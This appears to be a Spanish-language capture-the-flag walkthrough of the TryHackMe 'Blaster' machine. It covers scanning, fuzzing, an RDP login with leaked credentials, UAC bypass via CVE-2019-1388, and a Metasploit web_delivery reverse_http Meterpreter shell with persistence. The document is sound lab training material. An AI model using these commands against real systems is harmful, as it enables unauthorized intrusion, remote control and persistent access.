# Blaster v3

## Escaneo de puertos

Escaneamos la IP de la máquina usando `nmap`para encontrar los puertos abiertos y los servicios que tengan.

```
nmap -A -T4 -p- 10.10.10.249
```

Hay dos puertos abiertos: un servidor en web en el puerto 80 y un RDP en el 3389.

![Escaneo de puertos](images/Pasted%20image%2020250221152920.png)
## Fuzzing

Accedemos al servidor web.

![Servidor web](images/Pasted%20image%2020250221152959.png)

Es un servidor de Windows Server de IIS (Internet Information Services).

Abrimos el dirbuster y le hacemos fuzzing a la web para encontrar más directorios.

![Dirbuster](images/Pasted%20image%2020250221153206.png)

Encontramos un directorio llamado `retro`que puede ser importante.

![Directorio retro](images/Pasted%20image%2020250221153427.png)

## Investigating

Accedemos al mismo.

```
http://10.10.10.249/retro/
```

![Acceso retro](images/Pasted%20image%2020250221153510.png)

Encontramos un username, `Wade`y vemos que su contraseña está relacionada con la película "Ready Player One".

![Contraseña relacionada](images/Pasted%20image%2020250221153739.png)

Buscamos el nombre del avatar de Wade en el juego. Es `Parzival`.

![Avatar](images/Pasted%20image%2020250221153906.png)

Accedemos por el puerto 3389 donde está el servicio RDP funcionando. Usamos las credenciales que hemos encontrad.

```
xfreerdp /u:wade /p:parzival /v:10.10.10.249
```

![RDP acceso](images/Pasted%20image%2020250221154228.png)

Se nos abre el escritorio remoto del cliente Wade.

![Escritorio remoto](images/Pasted%20image%2020250221154325.png)

Abrimos `user.txt`y tenemos la primera flag.

![user.txt](images/Pasted%20image%2020250221154417.png)

```
THM{HACK_PLAYER_ONE}
```

Miramos por la máquina y encontramos este CVE:

```
CVE-2019-1388
```

## Escalada de privilegios

También encontramos un ejecutable en el escritorio `hhupd`.

![hhupd](images/Pasted%20image%2020250221155633.png)

Lo ejecutamos y nos pide los credenciales del Administrador. Le damos a "Show more details".

![Detalles de hhupd](images/Pasted%20image%2020250221155916.png)

Y luego "Show information about the publisher's certificate".

![Certificado](images/Pasted%20image%2020250221155950.png)

Hacemos clic en "VeriSign Commercial Software Publishers CA".

![VeriSign](images/Pasted%20image%2020250221160106.png)

Cerramos la ventana y se los habrá abierto una pestaña nueva en Internet Explorer que no cargará porque no hay Internet.

![Internet Explorer](images/Pasted%20image%2020250221162229.png)

Intentamos guardar la página haciendo clic en el engranaje arriba a la derecha y dándole a "File" y "Save as". Nos aparece un mensaje de error.

![Error al guardar](images/Pasted%20image%2020250221162407.png)

Le damos a "OK" y en el explorador de archivos escribimos `cmd.exe`.

![cmd.exe](images/Pasted%20image%2020250221162543.png)

Se nos abre el cmd y escribimos `whoami`para verificar que hemos hecho bien la escalada de privilegios.

![whoami](images/Pasted%20image%2020250221162633.png)

Nos movemos al escritorio del Administrador y tenemos un fichero llamado `root.txt`.
![root.txt](images/Pasted%20image%2020250221162727.png)

Y obtenemos la flag:

![Flag root.txt](images/Pasted%20image%2020250221162811.png)

```
THM{COIN_OPERATED_EXPLOITATION}
```

## Metasploit

Accedemos a la consola de metasploit.

```
msfconsole
```

Seleccionamos el siguiente exploit:

```
use exploit/multi/script/web_delivery
```

Mostramos los objetivos y seleccionamos el 2.

```
show targets
set target 2
```

![Metasploit targets](images/Pasted%20image%2020250221163459.png)

Mostramos las opciones y asignamos la IP de nuestro equipo local en la VPN de tryhackme por el puerto 8082.

```
set LHOST 10.8.3.33
set LPORT 8082
```

Seleccionamos el siguiente payload:

```
set payload windows/meterpreter/reverse_http
```

![Payload](images/Pasted%20image%2020250221164025.png)

Ejecutamos el exploit:

```
run -j
```

![Ejecutando exploit](images/Pasted%20image%2020250221164132.png)

Copiamos el código anterior en el `cmd.exe`de antes y tendremos acceso remoto completo al sistema.

![Acceso remoto](images/Pasted%20image%2020250221164301.png)

Con meterpreter, para que tenga persistencia escribimos el siguiente comando:

```
run persistence -X
```

















